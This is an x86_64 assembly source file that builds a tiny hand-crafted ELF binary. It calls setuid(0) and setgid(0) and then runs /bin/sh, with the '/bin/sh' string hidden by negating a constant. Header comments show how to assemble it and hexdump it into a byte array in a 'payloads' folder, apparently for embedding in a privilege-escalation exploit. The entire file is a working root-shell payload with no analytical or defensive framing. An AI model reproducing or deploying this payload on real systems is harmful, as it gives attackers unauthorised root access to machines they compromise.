; shell.S - Minimal ELF that spawns a root shell
;       Assembles to ~160-byte binary
;
; setuid(0)
; setgid(0)
; execve('/bin/sh', ['/bin/sh'], NULL)
;
; INP=shell; nasm -f bin -o $INP $INP.S
; hexdump -v -e '16/1 "0x%02x, " "\n"' payloads/shell


BITS 64

ehdr:                               ; ELF64_Ehdr
    db  0x7F, "ELF", 2, 1, 1, 0     ; e_ident
    times 8 db 0                    ; EI_PAD
    dw  2                           ; e_type = EXEC
    dw  0x3e                        ; e_machine = x86_64
    dd  1                           ; e_version
    dq  _start                      ; e_entry
    dq  phdr - $$                   ; e_phoff
    dq  0                           ; e_shoff
    dd  0                           ; e_flags
    dw  ehdrsize                    ; e_ehsize
    dw  phdrsize                    ; e_phentsize
    dw  1                           ; e_phnum
    dw  0                           ; e_shentsize
    dw  0                           ; e_shnum
    dw  0                           ; e_shstrndx

ehdrsize equ $ - ehdr

phdr:
    dd  1                           ; p_type = PT_LOAD
    dd  5                           ; p_flags = R + X
    dq  0                           ; p_offset
    dq  $$                          ; p_vaddr
    dq  $$                          ; p_paddr
    dq  filesize                    ; p_filesz
    dq  filesize                    ; p_memsz
    dq  0x1000                      ; p_align

phdrsize equ $ - phdr

_start:
    xor rdi, rdi
    mov al, 0x69                   ; sys_setuid
    syscall

    xor rdi, rdi
    mov al, 0x6a                   ; sys_setgid
    syscall

    mov rbx, 0xff978cd091969dd1
    neg rbx                        ; "/bin/sh"
    push rbx
    mov rdi, rsp                   ; rdi = pointer to "/bin/sh"
    push rsi                       ; argv[1] = NULL
    push rdi                       ; argv[0] = "/bin/sh"
    mov rsi, rsp                   ; rsi = argv
    mov al, 0x3b                   ; sys_execve
    syscall

filesize equ $ - $$

